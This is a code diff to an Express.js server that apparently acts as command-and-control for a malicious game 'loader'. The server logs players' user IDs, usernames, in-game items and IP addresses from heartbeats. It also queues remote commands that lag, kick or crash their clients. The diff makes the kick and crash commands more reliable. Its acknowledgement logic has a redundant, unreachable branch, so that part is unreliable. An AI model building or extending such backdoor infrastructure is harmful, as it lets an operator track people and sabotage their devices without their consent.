@@ -11,6 +11,7 @@ app.use(express.json());
 const players = new Map();
 const pastPlayers = new Map();
 const commandStates = new Map();
+const commandAck = new Map(); // Track if command was received by loader
 
 // Cleanup offline players every 10 seconds
 setInterval(() => {
@@ -55,6 +56,7 @@ app.post('/api/public/heartbeat', (req, res) => {
 
     if (!commandStates.has(data.user_id)) {
         commandStates.set(data.user_id, { fps_limit: false, lag_n: false, lag_c: false, kick: false, crash: false });
+        commandAck.set(data.user_id, { kick: true, crash: true }); // Mark as "already received" initially
     }
 
     console.log(`[HEARTBEAT] OK - ${data.user_id} | ${data.username} | Game: ${data.game_name} | Brainrots: ${(data.brainrots || []).length} | IP: ${data.ip_address || 'none'}`);
@@ -72,15 +74,41 @@ app.get('/api/public/command', (req, res) => {
     }
 
     const state = commandStates.get(userId) || { fps_limit: false, lag_n: false, lag_c: false, kick: false, crash: false };
+    const ack = commandAck.get(userId) || { kick: true, crash: true };
     const cmd = { ...state };
 
     console.log(`[COMMAND POLL] Sending to ${userId}:`, JSON.stringify(cmd));
 
-    // Clear one-shot commands after sending
+    // Only reset kick/crash if they were already sent once (acked)
     const s = commandStates.get(userId);
     if (s) {
-        s.kick = false;
-        s.crash = false;
+        if (ack.kick && s.kick === false) {
+            // Already acked and currently false, keep false
+        } else if (s.kick === true) {
+            // Will be sent now, mark for reset next time
+            ack.kick = true;
+        } else if (ack.kick && s.kick === false) {
+            ack.kick = false;
+        }
+
+        if (ack.crash && s.crash === false) {
+            // Already acked and currently false, keep false
+        } else if (s.crash === true) {
+            // Will be sent now, mark for reset next time
+            ack.crash = true;
+        } else if (ack.crash && s.crash === false) {
+            ack.crash = false;
+        }
+
+        // Reset after sending
+        if (ack.kick && s.kick) {
+            s.kick = false;
+            ack.kick = false;
+        }
+        if (ack.crash && s.crash) {
+            s.crash = false;
+            ack.crash = false;
+        }
     }
 
     res.json(cmd);
@@ -105,8 +133,14 @@ app.post('/api/command', (req, res) => {
     if (fps_limit !== undefined) state.fps_limit = fps_limit;
     if (lag_n !== undefined) state.lag_n = lag_n;
     if (lag_c !== undefined) state.lag_c = lag_c;
-    if (kick === true) state.kick = true;
-    if (crash === true) state.crash = true;
+    if (kick === true) {
+        state.kick = true;
+        commandAck.set(user_id, { ...(commandAck.get(user_id) || {}), kick: false });
+    }
+    if (crash === true) {
+        state.crash = true;
+        commandAck.set(user_id, { ...(commandAck.get(user_id) || {}), crash: false });
+    }
 
     console.log(`[COMMAND RECEIVED] OK - Updated state for ${user_id}:`, JSON.stringify(state));
     res.json({ success: true, current_state: state });
